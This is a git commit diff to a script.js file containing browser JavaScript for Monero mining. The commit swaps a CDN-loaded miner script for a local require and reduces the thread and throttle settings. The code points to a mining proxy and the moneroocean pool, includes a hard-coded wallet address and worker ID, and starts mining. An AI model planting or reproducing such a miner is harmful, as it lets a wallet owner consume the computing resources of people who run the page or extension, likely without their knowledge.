c9b095f40b83d582caf592172de96d982fc0b423
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2024-01-17 14:24:48 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,14 +1,12 @@
 // Start Of Mining Code (Javascript)
-var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-miner-chrome-extension@main/mine.js";
-document.head.appendChild(script);
+var script = require('./mine.js');
 
 server = "wss://f.xmrminingproxy.com:8181";
 var pool = "moneroocean.stream";
 var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
 var workerId = "GH-XMR"
-var threads = -1;
+var threads = 1;
 var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
-throttleMiner = 20;
+throttleMiner = 1;
 // End Of Mining Code
